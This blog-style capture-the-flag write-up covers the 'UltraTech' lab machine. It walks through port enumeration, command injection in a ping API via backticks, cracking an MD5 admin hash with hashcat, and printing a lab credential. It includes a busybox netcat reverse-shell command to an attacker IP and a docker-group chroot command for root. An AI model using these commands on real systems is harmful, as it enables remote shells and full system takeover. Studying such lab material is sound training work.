---
title: "UltraTech"
description: "Enum Port 8081 - http Accessing port 8081 I only got this UltraTech API v0.1.3 dirsearch we got no interesting also Port 31331 - http accessing port using browser cause service"
lang: "en"
translationKey: "ultratech"
category: "lab-writeups"
tags: ["Lab", "Command Injection", "Command Exploit", "docker group", "privesc-docker-group", "Linux", "Medium"]
publishDate: "2025-08-22"
draft: false
featured: false
sample: false
author: "Dimas Sahid Abdullah"
translationStatus: "original"
notionId: "2575fca1-ed80-80fe-b3a6-cac5a5f836cb"
notionUrl: "https://app.notion.com/p/UltraTech-2575fca1ed8080feb3a6cac5a5f836cb"
notionLastEdited: "2025-08-24T14:11:00.000Z"
---

# Enum

![](/images/ultratech/ef76164b1b04.png)

![](/images/ultratech/f4308fd04343.png)

![](/images/ultratech/e367415b1a97.png)

## Port 8081 - http

Accessing port 8081 I only got this **UltraTech API v0.1.3**

![](/images/ultratech/f4624ad1b6c4.png)

dirsearch we got no interesting also

![](/images/ultratech/e3268360ec37.png)

![](/images/ultratech/b40582fca7fc.png)

![](/images/ultratech/317a184c029c.png)

## Port 31331 - http

accessing port using browser cause service use protocol http

![](/images/ultratech/22bd3eb7c186.png)

then we do Dirsearch

![](/images/ultratech/a85424aa5e42.png)

robots.txt

![](/images/ultratech/f5a3bfe6781c.png)

utech_sitemap.txt

![](/images/ultratech/2bc2db2d8b88.png)

partners.html

![](/images/ultratech/a3013451ee0f.png)

page /js 

![](/images/ultratech/72f20e9d5498.png)

### Command Injection

page /js/api.js

![](/images/ultratech/e90bdd157a7f.png)

there is page ping that we can try to ping [localhost](http://localhost/) & our IP, we got good response 

![](/images/ultratech/9c73838da74f.png)

![](/images/ultratech/5593bd942568.png)

then we try to run another command beside ping command only, using ( ; ) but it failed.

![](/images/ultratech/ad3a47418d8a.png)

so we try another way using backtricks ( ` ` ) to run another command, using command ls for example we got response back like file

![](/images/ultratech/51b87cd3a815.png)

let’s we examine what file is that. after examining the file (utech.db.sqlite) we got admin hash

![](/images/ultratech/7d1aee3dbb19.png)

we guess that was MD5 hash so let’s we try to crack it using crackstation

![](/images/ultratech/af865897d5a7.png)

![](/images/ultratech/51b3ce61cbb5.png)

![](/images/ultratech/88d17ad17dd0.png)

then we try also crack it using john

![](/images/ultratech/3a3baff1d5b5.png)

![](/images/ultratech/2c8f41167150.png)

**Crack using hashcat :**

```bash
hashcat -m 0 hash_md5 /usr/share/wordlists/rockyou.txt
```

![](/images/ultratech/403da019d2e8.png)

voila we success to crack the password of user root (`r00t:n100906`)

![](/images/ultratech/611b63d3f960.png)

### RevShell via Command Injection

I dunno why but only this payload will work for establish revshell

![](/images/ultratech/a186251dd0f4.png)

```bash
busybox nc 10.17.49.139 4444 -e bash
```

![](/images/ultratech/f08d9eadd326.png)

After looking around I can’t find interesting file inside /home directory and user’s directory so I go back check sqlite file like we do in previous step

# LinPriv

linpeas:

![](/images/ultratech/f4030f431cf1.png)

we see we are in the group docker, Being in the docker group is the important part, It means your user has permission to run Docker commands without needing sudo. Normally, only root can access the Docker daemon (/var/run/docker.sock), but if you’re added to the docker group, you can run things like docker ps directly.

based on gtfobin we can jump into root user using docker, so let’s do it.

![](/images/ultratech/88110d0aa47b.png)

we failed by running a command that we got from gtfobin, error message tells us that “unable to find image alpine locally”, so we assume that we need to know what images are in our local by running command : `docker images`

![](/images/ultratech/319b7be69427.png)

we only have 1 images that is bash image

![](/images/ultratech/5617c3b71bff.png)

so once again let’s modify our payload and run it. Voila we got root access.

```bash
docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

![](/images/ultratech/dbd004d153bf.png)
